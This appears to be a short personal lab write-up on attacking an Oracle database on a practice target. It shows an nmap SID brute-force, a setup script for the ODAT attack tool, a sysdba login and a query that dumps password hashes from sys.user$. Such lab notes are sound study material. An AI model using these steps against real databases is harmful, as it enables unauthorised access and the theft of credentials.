# Simple Oracle practice

---

![Screenshot 2024-10-22 at 9.01.45 AM.png](Simple%20Oracle%20practice%2012724f42a85b80928880c02f3aa573c0/Screenshot_2024-10-22_at_9.01.45_AM.png)

Ip =10.129.205.19

```

└──╼ [★]$ sudo nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 08:04 CDT
Nmap scan report for 10.129.205.19
Host is up (0.0082s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.04 seconds

```

After this im going to enumerate deeper but for this I need a set of tools to use with oracle.

there is a bash script that I can run to setup everything

```
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

After installing it I will use odat.py

![Screenshot 2024-10-22 at 9.17.15 AM.png](Simple%20Oracle%20practice%2012724f42a85b80928880c02f3aa573c0/Screenshot_2024-10-22_at_9.17.15_AM.png)

![Screenshot 2024-10-22 at 9.39.11 AM.png](Simple%20Oracle%20practice%2012724f42a85b80928880c02f3aa573c0/Screenshot_2024-10-22_at_9.39.11_AM.png)

I logged in as sysdba to have administrative priv.

I then used 

```
select name, password from sys.user$;
```

![Screenshot 2024-10-22 at 9.40.02 AM.png](Simple%20Oracle%20practice%2012724f42a85b80928880c02f3aa573c0/Screenshot_2024-10-22_at_9.40.02_AM.png)

Here I found the password hash I was looking for.